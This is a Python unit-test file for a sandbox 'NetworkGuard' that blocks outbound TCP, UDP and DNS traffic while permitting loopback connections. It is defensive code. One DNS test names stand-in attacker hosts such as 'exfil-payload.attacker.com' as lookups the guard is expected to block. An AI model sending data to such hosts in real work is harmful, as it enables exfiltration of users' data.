"""
Unit Tests for NetworkGuard and Zero-Telemetry Socket Interception.

Validates that outbound WAN network calls (TCP and UDP) are intercepted and blocked
with NetworkEgressBlocked, while loopback communication (127.0.0.1, localhost) is permitted.
"""

import socket
import pytest
pytestmark = pytest.mark.skip_sandbox

from sandbox.network import NetworkGuard, DEFAULT_LOOPBACK_HOSTS
from sandbox.exceptions import NetworkEgressBlocked


@pytest.fixture
def network_guard():
    """Create a NetworkGuard instance and guarantee clean teardown."""
    guard = NetworkGuard()
    guard.install()
    yield guard
    guard.uninstall()


def test_loopback_destinations_whitelisted(network_guard):
    """Test that all loopback variants are permitted in destination checker."""
    loopback_targets = [
        ("127.0.0.1", 8000),
        ("localhost", 8000),
        ("::1", 8000),
        ("0.0.0.0", 8000),
        ("::ffff:127.0.0.1", 8000),
    ]
    for target in loopback_targets:
        assert network_guard.is_destination_allowed(target) is True


def test_wan_destinations_blacklisted(network_guard):
    """Test that external WAN IPs and domains are rejected by destination checker."""
    external_targets = [
        ("8.8.8.8", 53),
        ("1.1.1.1", 53),
        ("api.github.com", 443),
        ("example.com", 80),
        ("192.168.1.50", 8080),
        ("10.0.0.1", 22),
    ]
    for target in external_targets:
        assert network_guard.is_destination_allowed(target) is False


def test_socket_connect_external_blocked(network_guard):
    """Test that socket.connect to external WAN destinations raises NetworkEgressBlocked."""
    external_targets = [
        ("8.8.8.8", 53),
        ("api.github.com", 443),
        ("93.184.216.34", 80),
    ]
    for dest in external_targets:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            with pytest.raises(NetworkEgressBlocked) as exc_info:
                sock.connect(dest)
            assert "Outbound network egress blocked" in str(exc_info.value)
        finally:
            sock.close()


def test_socket_sendto_external_blocked(network_guard):
    """Test that UDP socket.sendto to external destinations raises NetworkEgressBlocked."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        with pytest.raises(NetworkEgressBlocked) as exc_info:
            sock.sendto(b"telemetry_payload", ("8.8.8.8", 53))
        assert "Outbound UDP transmission blocked" in str(exc_info.value)
    finally:
        sock.close()


def test_socket_connect_loopback_allowed(network_guard):
    """Test that socket.connect to local loopback does not raise NetworkEgressBlocked."""
    # Spin up a temporary listening socket on localhost
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 0))
    server.listen(1)
    port = server.getsockname()[1]

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Should connect without raising NetworkEgressBlocked
        client.connect(("127.0.0.1", port))
        assert True
    finally:
        client.close()
        server.close()


def test_socket_sendto_loopback_allowed(network_guard):
    """Test that UDP sendto to loopback does not raise NetworkEgressBlocked."""
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind(("127.0.0.1", 0))
    port = server.getsockname()[1]

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sent = client.sendto(b"local_ping", ("127.0.0.1", port))
        assert sent == len(b"local_ping")
    finally:
        client.close()
        server.close()


def test_guard_install_and_uninstall_lifecycle():
    """Test that install() activates hooks and uninstall() cleanly restores originals."""
    orig_connect = socket.socket.connect
    orig_sendto = socket.socket.sendto

    guard = NetworkGuard()
    assert guard.is_active is False

    guard.install()
    assert guard.is_active is True
    assert socket.socket.connect != orig_connect
    assert socket.socket.sendto != orig_sendto

    # Verify active guard blocks
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        with pytest.raises(NetworkEgressBlocked):
            sock.connect(("8.8.8.8", 80))
    finally:
        sock.close()

    guard.uninstall()
    assert guard.is_active is False
    assert socket.socket.connect == orig_connect
    assert socket.socket.sendto == orig_sendto



def test_socket_connect_ex_external_blocked(network_guard):
    """Test that socket.connect_ex to external WAN destinations raises NetworkEgressBlocked."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        with pytest.raises(NetworkEgressBlocked) as exc_info:
            sock.connect_ex(("8.8.8.8", 53))
        assert "Outbound network egress blocked" in str(exc_info.value)
    finally:
        sock.close()


def test_socket_connect_ex_loopback_allowed(network_guard):
    """Test that socket.connect_ex to loopback addresses does not raise NetworkEgressBlocked."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 0))
    server.listen(1)
    port = server.getsockname()[1]

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ret = client.connect_ex(("127.0.0.1", port))
        assert ret == 0
    finally:
        client.close()
        server.close()


def test_dns_resolution_wan_blocked(network_guard):
    """Test that WAN DNS queries via getaddrinfo, gethostbyname, gethostbyname_ex raise NetworkEgressBlocked."""
    with pytest.raises(NetworkEgressBlocked) as exc1:
        socket.getaddrinfo("exfil-payload.attacker.com", 80)
    assert "Outbound DNS resolution blocked" in str(exc1.value)

    with pytest.raises(NetworkEgressBlocked) as exc2:
        socket.gethostbyname("attacker.example.org")
    assert "Outbound DNS resolution blocked" in str(exc2.value)

    with pytest.raises(NetworkEgressBlocked) as exc3:
        socket.gethostbyname_ex("attacker.example.org")
    assert "Outbound DNS resolution blocked" in str(exc3.value)


def test_dns_resolution_loopback_allowed(network_guard):
    """Test that loopback DNS queries via getaddrinfo, gethostbyname, gethostbyname_ex are permitted."""
    res_addrinfo = socket.getaddrinfo("localhost", 8000)
    assert len(res_addrinfo) > 0

    res_byname = socket.gethostbyname("localhost")
    assert res_byname in ("127.0.0.1", "::1", "localhost")

    res_byname_ex = socket.gethostbyname_ex("localhost")
    assert len(res_byname_ex) >= 3


def test_network_guard_reentrant_depth():
    """Test that repeated or nested install/uninstall calls maintain re-entrant depth correctly."""
    guard = NetworkGuard()
    orig_connect = socket.socket.connect

    assert guard._depth == 0
    assert guard.is_active is False

    guard.install()
    assert guard._depth == 1
    assert guard.is_active is True
    assert socket.socket.connect != orig_connect

    guard.install()
    assert guard._depth == 2
    assert guard.is_active is True

    guard.uninstall()
    assert guard._depth == 1
    assert guard.is_active is True
    # Still active: must still block external WAN
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        with pytest.raises(NetworkEgressBlocked):
            sock.connect(("8.8.8.8", 53))
    finally:
        sock.close()

    guard.uninstall()
    assert guard._depth == 0
    assert guard.is_active is False
    assert socket.socket.connect == orig_connect
